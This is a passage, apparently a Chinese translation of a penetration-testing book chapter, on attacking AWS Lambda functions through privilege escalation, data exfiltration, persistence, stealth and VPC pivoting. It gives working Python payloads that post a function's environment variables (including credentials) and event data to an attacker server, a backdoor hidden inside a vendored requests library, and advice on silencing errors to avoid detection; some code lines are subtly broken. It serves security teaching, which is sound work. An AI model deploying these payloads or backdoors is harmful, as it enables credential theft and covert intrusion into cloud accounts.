+   正如我们之前讨论的，考虑将整个函数复制到你自己的 AWS 账户中进行测试，这样你就不需要在目标环境中制造噪音。

+   如果你有 CloudWatch 日志访问权限，请查看每个 Lambda 函数的执行日志，看看是否打印了任何敏感信息（存储在`"/aws/lambda/<function name>"`日志组中）。

+   你可以通过单击 AWS Web 控制台上的`"Actions"`下拉菜单，然后单击`"Export function"`，选择`"Download deployment package"`，来下载整个 Lambda 函数的`.zip`文件。然后，将其简单地移植到你自己的账户中。

+   尝试设计你的负载，使它们按照你的意愿执行而不会中断函数的执行。Lambda 函数执行出错可能会引起一些不必要的注意！

+   在编写负载时，要注意函数的超时。默认情况下，函数在三秒后超时，所以你需要一些快速、简单的外泄方式。

# 攻击具有读取和写入权限的 Lambda 函数

现在我们已经讨论了在你只有对 Lambda 的读取权限时攻击 Lambda 函数的方法，接下来我们将继续讨论读取和写入权限。在这种情况下，我们假设你作为攻击者拥有`"lambda:*"`权限，这基本上意味着你可以读取和写入任何内容，包括编辑现有函数、创建自己的函数、删除函数等。这开启了一个全新的攻击面，特别适合许多不同类型的攻击，尤其是权限提升、数据外泄和持久性。

对于这一部分，我们不会设置一个新的易受攻击函数，而是只使用我们之前设置的一些示例。

# 权限提升

通过 Lambda 函数进行权限提升相对容易，这取决于你遇到的设置。我们将看两种不同的情景：一种是你拥有`"lambda:*"`权限和`"iam:PassRole"`权限，另一种是仅具有`"lambda:*"`权限。

首先，我们假设除了完全的 Lambda 访问权限外，我们还拥有`"iam:PassRole"`权限。我们还假设我们可以列出 IAM 角色，但仅此而已（`iam:ListRoles`）。在这种情况下，我们的目标不一定需要积极使用 Lambda，我们就可以提升我们的权限。因为我们拥有 IAM `ListRoles` 权限，我们可以运行以下 AWS CLI 命令来查看账户中存在哪些 IAM 角色（确保指定你正在使用的正确配置文件）：

```

aws iam list-roles --profile LambdaReadWriteUser

```

你应该得到账户中每个角色及其`"AssumeRolePolicyDocument"`的列表。现在，我们可以通过这个列表筛选出 Lambda 可以承担的任何角色。以下是此响应中一个示例角色的样子（这是我们为我们的易受攻击函数创建的角色）：

```

{
    "Path": "/",
    "RoleName": "LambdaRoleForVulnerableFunction",
    "RoleId": "AROAIWA1V2TCA1TNPM9BL",
    "Arn": "arn:aws:iam::000000000000:role/LambdaRoleForVulnerableFunction",
    "CreateDate": "2018-12-19T21:01:17Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": "lambda.amazonaws.com"
                },
                "Action": "sts:AssumeRole
            }
        ]
    },
    "Description": "Allows Lambda functions to call AWS services on your behalf.",
    "MaxSessionDuration": 3600
}

```

我们可以看到，在`"AssumeRolePolicyDocument"`|`"Statement"` |`"Principal"`下指定了一个`"Service"`，它的值是`"lambda.amazonaws.com"`。这意味着 Lambda AWS 服务可以假定此角色并获取临时凭证。对于一个角色被附加到 Lambda 函数中，Lambda 必须能够承担这个角色。

现在，过滤掉角色列表，使得只剩下可以被 Lambda 承担的角色。同样，我们假定除了`ListRoles`和`PassRole`之外，我们没有任何更多的 IAM 权限，因此我们无法调查这些角色具有什么权限，我们最好的办法是尝试推断它们是用来与哪些服务一起工作的，根据它们的名称和描述。运行 IAM `ListRoles`时出现的一个角色的名称是`"LambdaEC2FullAccess"`，这清楚地说明了我们可以期待它具有的权限。EC2 是更有成效的服务之一，因此我们将针对我们的演示目标此角色。

在之前的章节中，我们看过 IAM `PassRole`权限，它允许我们将 IAM 角色“传递”给某个 AWS 资源，以便让它访问该角色的临时凭证。其中一个例子是将一个角色传递给 EC2 实例，这允许 EC2 服务访问该角色；我们甚至在本章早些时候将一个角色传递给我们易受攻击的 Lambda 函数。我们拥有对 Lambda 的完全访问权限和传递角色给 Lambda 函数的能力，这意味着我们基本上可以访问 Lambda 能够访问的任何角色。

这可以通过 AWS CLI 和 Lambda `CreateFunction` API 来完成，但我们将通过 AWS web 控制台来完成。首先，我们需要创建一个新的 Lambda 函数，给它起个名字（此演示中为`"Test"`），选择一个运行环境（再次选择`python3.7`），并在角色下拉菜单中选择`"Choose an existing role"`。然后，我们将从现有角色下拉菜单中选择`"LambdaEC2FullAccess"`，最后，点击`"Create function"`。

这一次，我们直接访问函数的代码，因此不需要提取或查看此角色的凭据。我们可以使用我们选择的编程语言的 AWS SDK 库，即 Python 的`boto3`库；它已包含在 Lambda 设置中，因此不需要将其作为函数的依赖项包括进来。现在，唯一剩下的就是决定如何使用我们获得访问权限的角色，根据名称，我们知道它具有`"EC2FullAccess"`权限，因此我们将导入`boto3`，创建一个 EC2 客户端，并调用 EC2 的`DescribeInstances`API。在 Python 中，这只需要几行代码，但我们需要格式化返回的 JSON 响应以便更容易阅读，因此我们还将使用 JSON 库。可以在这里看到：

```

import json
import boto3

def lambda_handler(event, context):
    ec2 = boto3.client('ec2')
    reservations = ec2.describe_instances())['Reservations']
    print(json.dumps(reservations, indent=2, default=str))

```

需要注意的是，我们不需要为`boto3`客户端指定凭据，因为如果我们没有明确传递任何内容，它将自动检查环境变量。这样，它将始终在 Lambda 函数中使用最新的凭据。

要执行该函数，我们需要创建一个测试事件，所以确保你点击橙色的保存按钮，然后直接点击左边的白色测试按钮：

![](img/8791b537-b937-4c1d-bd9d-94989dd775fe.png)

创建我们的测试事件的测试按钮

应该会弹出一个屏幕来设置一个测试事件；我们不关心它如何配置，因为我们实际上并没有使用该事件。它只是通过 Web 控制台运行函数所需的。我们将选择`Hello World`事件模板（你可以选择任何内容），并将其命名为`Test`，然后点击屏幕右下角的`Create`按钮：  

![](img/f729d0b7-8abc-4ee0-9c7e-091c8dd3890f.png)

为我们的函数创建一个简单的测试事件

现在我们只需再次点击“测试”按钮，它将使用我们刚创建的测试事件来执行我们的函数。我们在`us-west-2`地区发现了一个单独的 EC2 实例（`AWS_REGION`环境变量会自动设置为我们 Lambda 函数所在的区域，所以`boto3`会使用它进行 API 调用）。我们可以在执行结果选项卡中看到这些结果，在函数执行后应该会弹出：

![](img/3a4a3d86-4795-4cc7-b300-20ece08b8c2e.png)

关于 us-west-2 中 EC2 实例的一小部分信息

这次测试成功了，所以很明显我们可以编写任何我们想要的代码，并指示 IAM 角色执行我们想要的操作。也许我们想要启动一堆 EC2 实例，或者我们想要尝试使用这个 EC2 访问权限进行进一步的利用，或者还有许多其他可能性。如果你没有 IAM 的`ListRoles`权限，你可以查看其他现有的 Lambda 函数来查看它们附加的角色，然后你可以尝试它们来查看你获得了什么样的访问权限。

对于我们的第二个场景，我们假设我们没有 IAM 的`PassRole`权限，这意味着我们无法创建一个新的 Lambda 函数，因为函数需要传递一个角色。为了利用这种情况，我们需要与现有的 Lambda 函数一起工作。对于这个演示，我们将针对我们在本章前面创建的`VulnerableFunction`进行目标定位。

在这种情况下，我们需要更加小心，因为我们不是在创建新的 Lambda 函数，而是在修改现有函数。 我们不想干扰环境中正在进行的任何操作，因为首先，作为渗透测试人员，我们尽量要避免这种情况，其次，我们不希望作为攻击者引起比必要更多的注意。 Lambda 函数突然停止工作会引起注意的人们的极大警惕。 我们可以确保这不会发生，方法是确保我们向函数添加的任何代码不会干扰其余的执行，这意味着我们需要捕获并消除我们附加的任何代码引发的任何错误。 另外，由于我们可能不知道函数是否会在其正常执行中早期出错，我们应该尽量将我们的代码放在执行的开始附近，以确保它得到执行。

回到我们之前创建的`VulnerableFunction`，我们知道附加到它的角色具有 S3 权限，因为函数代码与 S3 交互（而且我们自己设置了角色）。 为了从简单的地方开始，我们只是要列出账户中的 S3 存储桶，以查看我们可以使用哪些。 我们可以通过在`VulnerableFunction`中添加以下代码来完成此操作，在第 6 行之后（在调用`lambda_handler()`后，但在运行任何其他代码之前）：

```

try:
    s3 = boto3.client('s3')
    print(s3.list_buckets())
except:
    pass

```

我们甚至可以像以前一样进一步，导入 JSON 库并格式化输出，但最好尽量对现有函数进行尽可能少的更改。 我们使用`try`/`except`块来确保出现的任何错误不会中止函数的执行，并将`pass`放在 except 块中，我们可以确保错误会被静默地丢弃，然后函数将像往常一样执行。 `VulnerableFunction`的开头现在应该是这样的：

![](img/e1d7eeef-e7aa-4212-9503-42aefa375920.png)

我们向`VulnerableFunction`添加了代码后的 VulnerableFunction 开头

这个载荷的唯一问题在于它假定我们可以查看此 Lambda 函数的执行日志，我们可能有或没有权限访问。 我们需要访问 CloudWatch 日志或能够使用测试事件运行函数，以便我们可以在 Web 控制台中查看输出。 现在我们会说我们没有 CloudWatch 访问权限，所以我们将使用测试事件。 下一个问题是，我们可能缺少围绕此 Lambda 函数的整个上下文。 我们不一定知道函数何时被调用是有意义的，函数何时会出错，它被调用的频率如何，如果在其正常触发器之外调用将会产生什么影响，以及许多其他问题。

要解决这个问题，我们可以选择忽略它，并针对函数运行测试事件，而不担心后果（这不是一个好主意，除非你非常确定它不会破坏环境中的任何东西，并且不会吸引防御者的不必要注意），或者我们可以修改我们的有效载荷来外泄凭证，有点像本章的第一节。这可能是最安全的方法，因为我们可以向函数添加我们的恶意有效载荷，在我们的外部服务器上设置监听器，然后只需等待 Lambda 函数被正常调用。为此，我们可以导入`subprocess`并像以前一样使用`curl`，但更简单的方法是使用 Python 的`requests`库。`Requests`不会自动包含在 Lambda 函数可用的默认库中，但是`botocore`会，而`botocore`依赖于`requests`库，因此我们可以使用一个很酷的技巧来导入和使用`requests`。我们使用以下`import`语句而不是`import requests`：

```

从 botocore.vendored 导入请求

```

现在，我们可以正常访问`requests`库了。因此，按照本章早期所做的类似方法，我们只需将所有环境变量发送到我们的外部服务器即可发送 HTTP `POST`请求。我们还可以在 Lambda 函数内部运行 AWS API 调用并外泄输出，这在技术上会更安全，因为 API 调用将来自预期的相同 IP 地址，而不是我们的外部攻击 IP；但是，拉取环境变量更加灵活，并且随着时间的推移需要对函数进行的修改较少，因此我们选择了这种方式。以下有效载荷将执行此操作（在这里我们假装`1.1.1.1`是我们外部服务器的 IP）：

```

try:
    import os
    from botocore.vendored import requests
    requests.post('http://1.1.1.1', json=os.environ.copy(), timeout=0.01)
except:
    pass
```

它使用`requests`库发送一个 HTTP `POST`请求，其中包含使用 OS 库获取的环境变量，并且将超时设置为`0.01`，以便发送请求；代码立即执行，而不是等待任何响应并导致 Lambda 函数本身超时。一旦将此有效载荷添加到目标 Lambda 函数中，我们只需等待函数通过正常手段被调用，最终我们将获得凭证发送到我们的服务器：

![](img/286eb121-c4d3-46c6-ba28-336429a9dc39.png)

接收包含 Lambda 函数所有环境变量的 POST 请求

# 数据外泄

数据外泄很可能与我们之前提升权限的方式非常相似，即我们很可能编辑现有函数并从中外泄数据。我们可以通过多种不同的方式来实现这一点，其中一些列在这里：

+   修改现有函数并通过`"event"`和`"context"`参数外泄数据

+   创建一个新的函数和相关触发器来响应 AWS 环境中的某些事件，例如在第十一章中，*使用 Boto3 和 Pacu 来维持 AWS 持久性*，我们每次创建新用户时就将凭据外泄

+   修改现有函数，并将我们的外泄有效负荷放置在函数中间的某个位置，以外泄在函数正常执行期间被收集/修改的数据

这里还有许多其他攻击向量；你只需要有创造力。

如果我们只是想要我们的有效负荷外泄传递到 `"event"` 参数中的值，我们可以使用前一个有效负荷的略微修改版本：

```

try:
    from botocore.vendored import requests
    requests.post('http://1.1.1.1', json=event, timeout=0.01)
except:
    pass

```

确保注意 Lambda 函数的指定超时时间。你不希望你的外泄占用太长时间，以致 Lambda 函数超时并完全失败，因此，当通过 Lambda 外泄大量数据时，最好要么确保超时已经设置为很长的时间，要么自己去修改它以增加超时时间。问题在于，目标的 Lambda 账单会增加，因为它们的函数完成所需时间比正常情况下要长，这将引起注意。

# 持久性

我们不打算深入探讨持久性，因为我们在上一章已经涵盖了这一点，但是，和攻击 Lambda 的其他方法一样，持久性可以通过新的 Lambda 函数或编辑现有的 Lambda 函数来建立。持久性也可能意味着一些不同的事情。你想要对 Lambda 函数持久访问 bash shell，还是想要对 AWS 环境进行持久访问，或者两者都要？这完全取决于上下文和作为攻击者所处的情况最适用的是什么。甚至可能值得在多个 Lambda 函数中设置后门，以防其中一个被捕捉并被防御者移除。

# 保持潜伏

这是你可以发挥创造力的地方。显然，向发送数据到随机 IP 地址的函数中添加的随机代码将会引起熟悉该代码并重新审视它的任何人的怀疑。在这种情况下，捕捉到的指标可能甚至没有被捕捉到的提示，但是开发人员碰巧注意到 Lambda 函数中的这段奇怪的代码，并提出了一个问题，然后你被抓住了。如果在整个函数的开头放置恶意代码，那么这将会更明显，因此在代码的某处嵌套你的有效负荷将有所帮助。

将负载放置在入口函数（`lambda_handler()`）中不会改变任何内容，并且几乎不可能被人工审查/发现的地方怎么样？听起来好像太好了，但这不是真的！恶意黑客多年来一直在使用类似的技术，使其软件/硬件后门能够长时间保持活动状态，所以让我们将这种技术应用到 Lambda 中，并保持低调！

这种技术涉及到给 Lambda 函数依赖项设置后门。并非每一个你可能需要的库都包含在 Lambda 的基本库集中，就像我们在直接`import requests`时看到的那样，所以开发人员被迫自行收集这些依赖项，并将它们与其余的代码一起上传到 Lambda。我们将简要介绍一个简单示例。

假设我们无法通过`from botocore.vendored import requests`导入`requests`库，并且我们需要将该库包含在我们的 Lambda 代码中。可以通过将`requests`库与我们的基本 Lambda 代码一起包含，并将其上传为`.zip`文件到 Lambda 来解决这个问题。

对于这个示例，我们有一个`lambda_function.py`文件，导入了`requests`并向[`google.com/`](https://google.com/)发出请求，然后打印响应文本。`requests`库以其全部内容包含在旁边，以允许在以下截图中的第 2 行代码中使用`import requests`。`requests`库还需要`chardet`、`urllib3`、`idna`和`certify`库，因此这些也已被包含进来：

![](img/0ed9d39c-4529-40a5-b318-752f416e69eb.png)

使用已包含请求库的示例 Lambda 函数

这个函数很短，所以在我们的攻击期间直接修改代码将对任何人都很明显，但因为它导入了`requests`库，而`requests`库源代码也在那里，所以那将是我们的目标。我们可以看到在第 4 行调用了`requests.get()`方法。如果我们在`requests`库的源代码中查找，我们可以找到`api.py`文件中的`requests.get()`方法，在此写作时位于第 63 行：

![](img/292e3758-55b4-461a-b11a-ba9f58338ab2.png)

`requests.get()`方法的源代码

我们已经知道每次 Lambda 函数运行时都会调用这个方法，所以我们只需要直接修改它，而不是修改调用它的文件（`lambda_function.py`）。这次我们的负载需要有所不同，因为整个`requests`库并未直接导入到`requests`库的每个文件中，所以我们必须使用`"request"`方法，而不是`requests.post()`。我们的负载将如下所示：

```

try:
    data = {'url': url, 'params': params, **kwargs}
    requests('POST', 'http://1.1.1.1', json=data, timeout=0.01)
except:
pass
```

这个 payload 基本上只是在完成原始请求之前窃取到发送到我们自己服务器的每个请求的所有细节。我们可能能够截获一些敏感数据以利用我们自己的利益。我们可以将恶意的窃取 payload 直接放在`get`方法中，如下面的截图所示：

![](img/30132e26-f6ca-417a-99b1-593714e5a6e2.png)

我们的 payload 放置在 requests.get() 方法中

即使看起来有点奇怪，很少有开发人员会想要审查他们包含的库的源代码，即使他们这样做了，他们也没有编写该库，因此它们可能不会被他们认为是奇怪的。现在，每当这个 Lambda 函数被调用时，`requests.get()` 方法将被调用，这意味着我们的 payload 将被执行，我们将窃取一些数据：

![](img/bb406a51-c093-499e-86a9-96ad2b3c23ec.png)

从 Python 依赖中成功窃取

我们现在已经成功地从一个 Lambda 函数中窃取了信息，而不需要修改主函数的任何实际代码。这种攻击可以深入多个层次。如果主 Lambda 函数需要库 X，而库 X 中的方法需要库 Y，那么你可以一直倒退到库 Y。没有限制，只要你的方法以某种方式被调用。

在真实的攻击场景中，你所需要做的就是像我们之前做的那样将 Lambda 函数导出为一个 `.zip` 文件，进行修改，然后将其重新上传为该函数的最新版本。即使防御者看到函数被修改了，他们仍然可能永远找不到你实施的后门。

# 进入虚拟专用云

我们已经涵盖了许多关于攻击 Lambda 函数的内容，但在本节中，我们将讨论从访问 Lambda 函数到访问**虚拟专用云**（**VPC**）内部网络的转变。这是可能的，因为 Lambda 函数可以出于各种原因启动到 VPC 中。这为我们攻击者提供了具有与 Lambda 访问权限的能力来与我们可能无法获得访问权限的内部主机和服务进行交互的能力。

再次，我们可以从两个不同的角度来解决这个问题。如果我们有所需的权限，我们可以将一个新的 Lambda 函数启动到我们选择的 VPC 中，或者我们可以修改已经启动到 VPC 中的 Lambda 函数的代码。我们将运行一个演示，在其中我们将编辑一个已经启动到 VPC 中的函数。

对于这个演示，如果我们查看 Lambda Web UI 中的网络选项卡，我们可以看到这个函数已经启动到默认的 VPC 中，它在两个子网中，并且它在安全组 `sg-0e9c3b71` 中。我们还可以看到安全组允许从某个 IP 地址对端口 80 进行入站访问，并允许从同一安全组内的服务器访问所有端口：

![](img/379e712a-23b8-492e-9ac0-c9e9b00a778e.png)

我们目标 Lambda 函数的网络设置

然后，我们将运行 EC2 `DescribeInstances` API 调用，以找出在这个 VPC 中存在哪些其他服务器。我们可以用以下 AWS CLI 命令来做到这一点：

```

aws ec2 describe-instances

```

或者，我们可以使用`"ec2__enum"` Pacu 模块。结果告诉我们有一个 EC2 实例，并且它与我们的 Lambda 函数属于相同的安全组：

![](img/20938411-2a70-46c9-9939-9925406bc8eb.png)

与我们的 Lambda 函数属于相同安全组的一个 EC2 实例

基于我们在这个安全组的入站规则中看到的内容，我们知道我们的 Lambda 函数可以访问那个 EC2 实例上的每个端口。我们还知道，很可能有一些东西在`80`端口上被托管，因为相同的安全组将对端口`80`的访问权限白名单到了不同的 IP 地址。作为一个拥有少量 EC2 权限的攻击者，通常很难进入 VPC 的内部，但 Lambda 函数却让我们规避了这一点。我们只需要修改 Lambda 函数中的代码来在 VPC 的网络内部实现我们想要的功能。

我们将忽略目标 Lambda 函数中的任何代码，只专注于我们的负载，以访问内部网络。我们知道我们想要联系内部主机的`80`端口，这很可能意味着有一个运行的 HTTP 服务器，所以我们可以再次使用`requests`库向其发出请求。我们仍然不想中断任何生产代码，所以一切都将被包装在`try`/`except`块中，就像之前一样。刚才一分钟前的 EC2 `DescribeInstances`调用给我们了目标 EC2 实例的内部 IP 地址，是`172.31.32.192`。我们的负载将看起来像这样：

```
try:
    from botocore.vendored import requests
    req = requests.get('http://172.31.32.192/')
    print(req.text)
except:
    pass
```

为了简单起见，我们将只将输出打印到控制台并在那里查看，但这是另一种可能需要某种外泄的情况。但是，请确保您的 Lambda 函数具有 Internet 访问权限，因为当它们被启动到 VPC 中时，它们会失去默认的 Internet 访问权限，并依赖于 VPC 来提供该访问权限。

在运行有效负载以尝试向该内部 IP 发出 HTTP 请求后，我们在 Lambda 控制台中看到了以下内容：

![](img/c8ed9d36-5578-42ed-8b50-ce50c7e375a8.png)

我们联系了内部服务器并收到了回应

就这样，我们可以看到，我们已经访问了内部网络，以绕过网络限制，并访问了我们正在攻击的公司的某种内部人力资源门户。在底部，我们甚至可以看到一张包含一些私人员工信息的表，例如他们的薪水。

这样就可以轻松地访问 AWS 网络的内部侧。这种方法可以用于各种不同的攻击，例如访问不公开可访问的 RDS 数据库，因为我们可以将 Lambda 函数启动到其所在的 VPC /子网中并与其进行连接。各种 AWS 服务都有将资源启动到私有 VPC 以禁用对其的公共访问的选项，而这种进入 VPC 内部的方法使我们能够访问所有这些不同的服务；其他一些示例包括`ElastiCache`数据库，EKS 集群等。

# 摘要

AWS Lambda 是一项非常多才多艺且有用的服务，既适用于 AWS 用户，也适用于攻击者。作为攻击者，我们可以利用 Lambda 的许多可能性，其中最好的一点是，我们的目标甚至不一定需要自己使用 Lambda，也可以使我们受益。

由于 Lambda 有许多不同的用例，它总是我们要检查的更高优先级服务之一，因为它通常会产生非常有益的攻击路径，使我们能够进一步访问 AWS 环境。还要记住的一件事是，与许多服务（包括 Lambda）一样，它们不断发展，打开和关闭不同的攻击路径，我们可以利用；保持最新和知识渊博非常重要，因为我们正在攻击的帐户将利用这些变化。
